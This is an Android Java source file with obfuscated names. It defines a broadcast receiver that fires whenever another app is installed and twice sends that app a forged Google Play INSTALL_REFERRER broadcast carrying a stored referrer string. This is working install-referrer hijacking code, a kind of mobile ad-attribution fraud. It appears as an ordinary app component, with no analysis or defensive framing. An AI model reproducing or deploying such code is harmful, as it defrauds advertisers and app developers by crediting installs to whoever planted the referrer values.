package c.g.z;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.text.TextUtils;
import android.util.Log;

import c.g.z.Utils.A;


/**
 * Created by admin on 2017/8/21.
 */


public class E extends BroadcastReceiver {

    public static String SAVE_GP_MSG = "gp_msg";

    private static final String TAG = "Welog";

    @Override
    public void onReceive(Context context, Intent intent) {

        String action = intent.getAction();

        if (action.equals(Intent.ACTION_PACKAGE_ADDED)) {

            /**获取到安装的包**/

            String packName = intent.getDataString();

            String realpackname = packName.substring(packName.indexOf(":") + 1, packName.length());

            String sendMsg = getMsg(context, realpackname);

            Log.i("love", "onReceive: sendMsg：" + sendMsg);

            if (!TextUtils.isEmpty(sendMsg)) {

                // if (OtherUtils.checkInstatllNum(context, realpackname) ) {

                //  XmlShareTool.updataInstallNum(context, realpackname);

                sendMsg(context, realpackname, sendMsg);

                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                sendMsg(context, realpackname, sendMsg);
            }
            // }
        }

        Log.i(TAG, "onReceive: 广播：" + intent.getAction());

        A.getInstance(context.getApplicationContext()).init();

    }

    private String getMsg(Context context, String tag) {
        return context.getSharedPreferences(SAVE_GP_MSG, 0).getString(tag, null);
    }

    public void sendMsg(Context context, String str, String str2) {


        Log.i("love", "do send msg");

        Intent intent = new Intent("com.android.vending.INSTALL_REFERRER");
        if (Build.VERSION.SDK_INT >= 13) {
            intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
        }
        intent.putExtra("referrer", str2);
        intent.setPackage(str);
        context.sendBroadcast(intent);
    }

}
